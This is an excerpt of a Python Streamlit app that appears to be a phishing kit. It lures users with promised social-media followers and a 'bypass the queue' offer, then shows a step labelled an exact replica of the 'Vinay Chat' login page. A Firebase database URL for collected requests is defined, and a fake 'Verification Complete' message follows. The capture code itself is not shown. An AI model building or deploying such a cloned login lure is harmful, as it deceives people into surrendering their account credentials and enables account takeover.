...
# --- 2. CLEAN BULLETPROOF STRUCTURAL CSS INJECTION ---
GLOBAL_CSS = "<style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap'); html, body, [class*='css'] { font-family: 'Inter', sans-serif; } div[data-baseweb='input'] { background-color: #f8fafc !important; border: 1px solid #cbd5e1 !important; border-radius: 8px !important; } div[data-baseweb='input'] input { color: #000000 !important; font-weight: 600 !important; font-size: 15px !important; } .premium-header { text-align: center; margin-bottom: 20px; } .title-gradient { background: linear-gradient(90deg, #1d4ed8, #9333ea); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 32px; font-weight: 800; } .card-box { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.06); border: 1px solid #e2e8f0; }</style>"
st.markdown(GLOBAL_CSS, unsafe_allow_html=True)

# --- 3. DATABASE PATHWAY ---
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/vinay_chat_requests.json"

# --- 4. SESSION ARCHITECTURE RULES ---
...
# ==========================================
    ...
    token_html = "<div class='card-box' style='text-align:center;'><h3>Your Token: <span style='color:#ef4444;'>" + str(st.session_state.token) + "</span></h3><p style='color:#64748b;'>Standard delivery time is <b>24 Hours</b>.</p><hr><h4 style='color:#10b981;'>Want it in 1 Hour?</h4><p>Verify your official Vinay Chat ID to bypass the queue.</p></div>"
...
# ==========================================
# STEP 5: EXACT VINAY CHAT LOGIN REPLICA (CLONE FRAME)
# ==========================================
elif st.session_state.step == 5:
    STEP5_CSS = "<style>.stApp { background-color: #f5f5f5 !important; } div[data-testid='stVerticalBlock'] > div:first-child { background-color: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); max-width: 400px; margin: auto; } .vc-logo { color: #ef4444; font-size: 32px; font-weight: 600; text-align: center; margin-bottom: 0px; margin-top: -20px; } .vc-brand { color: #000000; font-size: 36px; font-weight: 500; text-align: center; margin-top: 0px; margin-bottom: 30px; } div[data-baseweb='input'] { background-color: #f9fafb !important; border: none !important; } label { color: #6b7280 !important; font-size: 13px !important; font-weight: 600 !important; } .stButton > button { background-color: #fffc00 !important; color: #000000 !important; border-radius: 30px !important; width: 150px !important; display: block !important; margin: 30px auto 10px auto !important; font-weight: 700 !important; border: none !important; box-shadow: 0 2px 5px rgba(255, 252, 0, 0.4) !important; } .stButton > button:hover { background-color: #e6e300 !important; } .vc-footer { text-align: center; font-size: 14px; margin-top: 40px; color: #4b5563; } .vc-footer b { color: #000000; }</style>"
...
# ==========================================
# STEP 6: FINAL CONGRATULATIONS LAYER
# ==========================================
    ...
    success_html = "<div class='card-box' style='text-align:center;'><h2 style='color:#10b981;'>Verification Complete ✅</h2><p>Your official Vinay Chat account is linked securely.</p><p style='color:#3b82f6; font-weight:600;'>Followers will be injected into your profile within the next 1 Hour.</p></div>"
